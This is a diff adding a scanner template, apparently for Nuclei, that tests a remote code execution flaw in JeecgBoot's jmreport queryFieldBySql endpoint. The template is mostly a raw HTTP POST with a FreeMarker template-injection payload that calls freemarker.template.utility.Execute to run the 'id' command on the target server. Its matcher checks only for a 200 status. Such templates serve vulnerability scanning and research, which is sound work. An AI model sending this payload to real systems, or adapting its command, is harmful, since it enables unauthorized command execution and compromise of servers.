@@ -1,0 +1,51 @@
+id: poc-gdkkmqoh3ewqkwai
+info:
+  name: jeecg-queryFieldBySql-rce
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdkkmqoh3ewqkwai'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gdkkmqoh3ewqkwai
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /jmreport/queryFieldBySql HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Accept: */*
+
+
+    Connection: close
+
+
+    Content-Type: application/json
+
+
+
+
+    {"sql":"select ''<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'' "}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
